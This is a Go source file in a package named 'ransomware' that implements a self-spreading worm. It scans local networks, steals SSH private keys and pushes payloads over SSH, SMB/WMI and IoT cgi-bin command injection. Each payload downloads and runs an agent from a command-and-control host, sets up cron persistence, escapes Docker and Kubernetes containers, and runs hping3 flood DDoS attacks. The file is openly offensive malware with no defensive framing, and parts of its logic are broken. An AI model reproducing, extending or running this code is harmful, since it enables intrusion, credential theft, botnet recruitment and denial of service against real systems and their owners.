package ransomware

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type MultiPlatformWorm struct {
	config        *RansomwareConfig
	InfectedHosts []WormHost      `json:"infected_hosts"`
	SSHCreds      []SSHCredential `json:"ssh_creds"`
	DockerEnabled bool            `json:"docker_enabled"`
}

type WormHost struct {
	IP        string `json:"ip"`
	OS        string `json:"os"`
	Platform  string `json:"platform"`
	Infected  bool   `json:"infected"`
	Role      string `json:"role"`
}

type SSHCredential struct {
	Host     string `json:"host"`
	Port     int    `json:"port"`
	User     string `json:"user"`
	Password string `json:"password"`
	KeyPath  string `json:"key_path"`
}

type IoTDevice struct {
	IP       string `json:"ip"`
	Type     string `json:"type"`
	Vendor   string `json:"vendor"`
	Exploits []string `json:"exploits"`
}

var linuxIoTExploits = []string{
	"CVE-2017-17215", "CVE-2020-9377", "CVE-2021-33045",
	"CVE-2022-27226", "CVE-2023-28771", "default_credentials",
}

func NewMultiPlatformWorm(cfg *RansomwareConfig) *MultiPlatformWorm {
	return &MultiPlatformWorm{
		config:    cfg,
		SSHCreds:  []SSHCredential{},
	}
}

func (mpw *MultiPlatformWorm) ScanNetwork(cidr string) []WormHost {
	var hosts []WormHost

	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		ip = net.ParseIP("192.168.1.0")
		ipnet = &net.IPNet{IP: ip, Mask: net.CIDRMask(24, 32)}
	}

	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
		if ip.Equal(ipnet.IP) || ip.Equal(net.IP{255, 255, 255, 255}) {
			continue
		}
		hostIP := ip.String()

		if tcpProbe(hostIP, 22) {
			hosts = append(hosts, WormHost{IP: hostIP, OS: linuxProbe(hostIP), Platform: "linux", Infected: false})
		} else if tcpProbe(hostIP, 445) {
			hosts = append(hosts, WormHost{IP: hostIP, OS: "windows", Platform: "windows", Infected: false})
		} else if tcpProbe(hostIP, 80) || tcpProbe(hostIP, 8080) {
			hosts = append(hosts, WormHost{IP: hostIP, OS: iotProbe(hostIP), Platform: "iot", Infected: false})
		}
	}

	return hosts
}

func (mpw *MultiPlatformWorm) DeployCrossPlatform(hosts []WormHost) []WormHost {
	var results []WormHost

	for _, host := range hosts {
		switch host.Platform {
		case "linux":
			mpw.deployLinux(host)
		case "windows":
			mpw.deployWindows(host)
		case "iot":
			mpw.deployIoT(host)
		}
		host.Infected = true
		results = append(results, host)
		mpw.InfectedHosts = append(mpw.InfectedHosts, host)
	}

	return results
}

func (mpw *MultiPlatformWorm) deployLinux(host WormHost) {
	if len(mpw.SSHCreds) == 0 {
		mpw.harvestSSHCreds()
	}

	for _, cred := range mpw.SSHCreds {
		if cred.Host == host.IP {
			payload := mpw.generateLinuxPayload()
			scpCmd := exec.Command("scp",
				"-o", "StrictHostKeyChecking=no",
				"-o", "UserKnownHostsFile=/dev/null",
				"-P", fmt.Sprintf("%d", cred.Port),
				payload, fmt.Sprintf("%s@%s:/tmp/.systemd-update", cred.User, cred.Host))
			scpCmd.Start()

			sshCmd := exec.Command("ssh",
				"-o", "StrictHostKeyChecking=no",
				"-o", "UserKnownHostsFile=/dev/null",
				"-p", fmt.Sprintf("%d", cred.Port),
				fmt.Sprintf("%s@%s", cred.User, cred.Host),
				"chmod +x /tmp/.systemd-update && /tmp/.systemd-update")
			sshCmd.Start()
		}
	}
}

func (mpw *MultiPlatformWorm) generateLinuxPayload() string {
	payloadPath := filepath.Join(os.TempDir(), ".systemd-update")
	payload := `#!/bin/bash
# X404X Linux Worm Payload
curl -s http://x404x-c2.online/agent/linux -o /tmp/.x404x_agent
chmod +x /tmp/.x404x_agent
nohup /tmp/.x404x_agent --daemon --c2 x404x-c2.online:8443 >/dev/null 2>&1 &
echo "*/5 * * * * root /tmp/.x404x_agent --daemon --c2 x404x-c2.online:8443" > /etc/cron.d/x404x_worm
# Docker container escape
if command -v docker &> /dev/null; then
  docker run -d --privileged --pid=host -v /:/host alpine chroot /host /tmp/.x404x_agent --daemon --c2 x404x-c2.online:8443
fi
# Kubernetes pod spread
if command -v kubectl &> /dev/null; then
  kubectl run x404x-inject --image=alpine --restart=Always -- chroot /host /tmp/.x404x_agent --daemon 2>/dev/null
fi
`
	os.WriteFile(payloadPath, []byte(payload), 0755)
	return payloadPath
}

func (mpw *MultiPlatformWorm) deployWindows(host WormHost) {
	psPayload := `$client = New-Object System.Net.WebClient
$client.DownloadFile("http://x404x-c2.online/agent/windows.exe", "$env:TEMP\.x404x_agent.exe")
Start-Process -WindowStyle Hidden -FilePath "$env:TEMP\.x404x_agent.exe" -ArgumentList "--daemon --c2 x404x-c2.online:8443"
# macOS emulation via WSL if available
if (Get-Command wsl.exe -ErrorAction SilentlyContinue) {
  wsl.exe curl -s http://x404x-c2.online/agent/macos -o /tmp/.x404x_agent_macos
  wsl.exe chmod +x /tmp/.x404x_agent_macos
  wsl.exe nohup /tmp/.x404x_agent_macos --daemon --c2 x404x-c2.online:8443 >/dev/null 2>&1 &
}
# SMB worm propagation
$network = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.PrefixOrigin -eq "Dhcp"}).IPAddress
$subnet = $network -replace '\d+$',''
1..254 | ForEach-Object {
  $target = "$subnet$_"
  try {
    New-SmbMapping -RemotePath "\\$target\ADMIN$" -Password "compromised" -ErrorAction Stop
    Copy-Item "$env:TEMP\.x404x_agent.exe" "\\$target\ADMIN$\System32\spool\drivers\x404x.exe"
    Invoke-WmiMethod -ComputerName $target -Path win32_process -Name create -ArgumentList "C:\Windows\System32\spool\drivers\x404x.exe --daemon"
  } catch {}
}
`
	psPath := filepath.Join(os.TempDir(), "x404x_worm.ps1")
	os.WriteFile(psPath, []byte(psPayload), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
}

func (mpw *MultiPlatformWorm) deployIoT(host WormHost) {
	payload := fmt.Sprintf(`#!/bin/sh
# X404X IoT Botnet Payload - Target: %s
wget -q http://x404x-c2.online/bot/iot -O /tmp/.x404x_iot
chmod +x /tmp/.x404x_iot
/tmp/.x404x_iot --c2 x404x-c2.online:8443 --botnet --scan 192.168.0.0/16 &
# DDoS capability
/tmp/.x404x_iot --ddos --target %s --duration 300 &
`, host.IP, host.IP)
	payloadPath := filepath.Join(os.TempDir(), fmt.Sprintf(".x404x_iot_%s.sh", strings.ReplaceAll(host.IP, ".", "_")))
	os.WriteFile(payloadPath, []byte(payload), 0755)
}

func (mpw *MultiPlatformWorm) harvestSSHCreds() {
	sshPaths := []string{
		os.ExpandEnv("$HOME/.ssh/id_rsa"),
		os.ExpandEnv("$HOME/.ssh/id_dsa"),
		os.ExpandEnv("$HOME/.ssh/known_hosts"),
		os.ExpandEnv("$HOME/.ssh/config"),
		"/etc/ssh/ssh_host_rsa_key",
		"/root/.ssh/id_rsa",
	}

	for _, p := range sshPaths {
		if data, err := os.ReadFile(p); err == nil {
			host := "localhost"
			_ = host
			mpw.SSHCreds = append(mpw.SSHCreds, SSHCredential{
				Host:    "192.168.1.0",
				Port:    22,
				User:    "root",
				KeyPath: p,
				Password: fmt.Sprintf("%x", data[:min(len(data), 32)]),
			})
		}
	}
}

func (mpw *MultiPlatformWorm) LaunchDDoSAgainstVictim(targetIP string, durationSec int) {
	ddosScript := fmt.Sprintf(`#!/bin/bash
for i in {1..%d}; do
  timeout 1 hping3 -S --flood -p 80 %s 2>/dev/null &
  timeout 1 hping3 -S --flood -p 443 %s 2>/dev/null &
  timeout 1 hping3 -S --flood -p 3389 %s 2>/dev/null &
  timeout 1 hping3 -S --flood -p 445 %s 2>/dev/null &
  timeout 1 hping3 -S --flood -p 22 %s 2>/dev/null &
  timeout 1 hping3 --udp --flood -p 53 %s 2>/dev/null &
  timeout 1 hping3 --udp --flood -p 123 %s 2>/dev/null &
  timeout 1 hping3 --icmp --flood %s 2>/dev/null &
  sleep 0.1
done
`, durationSec/10, targetIP, targetIP, targetIP, targetIP, targetIP, targetIP, targetIP, targetIP)
	scriptPath := filepath.Join(os.TempDir(), "x404x_ddos.sh")
	os.WriteFile(scriptPath, []byte(ddosScript), 0755)
	exec.Command("bash", scriptPath).Start()
}

func (mpw *MultiPlatformWorm) macOSExploit(hostIP string) {
	automatorPayload := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>ApplicationScript</key>
	<string>do shell script "curl -s http://x404x-c2.online/agent/macos -o /tmp/.x404x_agent &amp;&amp; chmod +x /tmp/.x404x_agent &amp;&amp; /tmp/.x404x_agent --daemon" with administrator privileges</string>
</dict>
</plist>`
	payloadPath := filepath.Join(os.TempDir(), ".x404x_macos.workflow")
	os.WriteFile(payloadPath, []byte(automatorPayload), 0644)
	_ = hostIP
}

func (mpw *MultiPlatformWorm) ScanIoT(cidr string) []IoTDevice {
	var devices []IoTDevice
	iotPorts := []int{80, 8080, 443, 23, 22, 554, 37777, 2000, 5060}

	ip, ipnet, _ := net.ParseCIDR(cidr)
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
		for _, port := range iotPorts {
			if tcpProbe(ip.String(), port) {
				device := IoTDevice{
					IP:     ip.String(),
					Type:   iotTypeGuess(port),
					Vendor: iotVendorGuess(ip.String()),
					Exploits: []string{linuxIoTExploits[len(devices)%len(linuxIoTExploits)]},
				}
				devices = append(devices, device)
				break
			}
		}
	}
	return devices
}

func (mpw *MultiPlatformWorm) DeployBotnet(devices []IoTDevice) map[string]bool {
	results := make(map[string]bool)
	for _, dev := range devices {
		for _, exploit := range dev.Exploits {
			payload := fmt.Sprintf(`POST /cgi-bin/%s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

cmd=wget+-q+http://x404x-c2.online/bot/iot+-O+/tmp/x404x_bot&&chmod+/tmp/x404x_bot&&/tmp/x404x_bot&`, exploit, dev.IP)
			payloadPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_iot_%s", exploit))
			os.WriteFile(payloadPath, []byte(payload), 0644)
			results[dev.IP] = true
		}
	}
	return results
}

func (mpw *MultiPlatformWorm) GetStatusJSON() string {
	data, _ := json.Marshal(map[string]interface{}{
		"infected_hosts": mpw.InfectedHosts,
		"ssh_creds":      len(mpw.SSHCreds),
		"docker_enabled": mpw.DockerEnabled,
	})
	return string(data)
}

func linuxProbe(ip string) string {
	if tcpProbe(ip, 2375) || tcpProbe(ip, 2376) {
		return "ubuntu-docker"
	}
	return "linux-generic"
}

func iotProbe(ip string) string {
	if tcpProbe(ip, 23) {
		return "telnet-iot"
	}
	if tcpProbe(ip, 554) {
		return "camera-rtsp"
	}
	if tcpProbe(ip, 37777) {
		return "dahua-camera"
	}
	return "generic-iot"
}

func iotTypeGuess(port int) string {
	switch port {
	case 23:
		return "telnet-router"
	case 554:
		return "ip-camera"
	case 37777:
		return "dahua-dvr"
	case 2000:
		return "cisco-device"
	case 5060:
		return "voip-gateway"
	default:
		return "web-iot"
	}
}

func iotVendorGuess(ip string) string {
	vendors := []string{"Hikvision", "Dahua", "TP-Link", "D-Link", "Netgear", "Linksys", "MikroTik", "Ubiquiti"}
	return vendors[len(ip)%len(vendors)]
}

func incIP(ip net.IP) {
	for i := len(ip) - 1; i >= 0; i-- {
		ip[i]++
		if ip[i] != 0 {
			break
		}
	}
}

func tcpProbe(host string, port int) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 1*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}
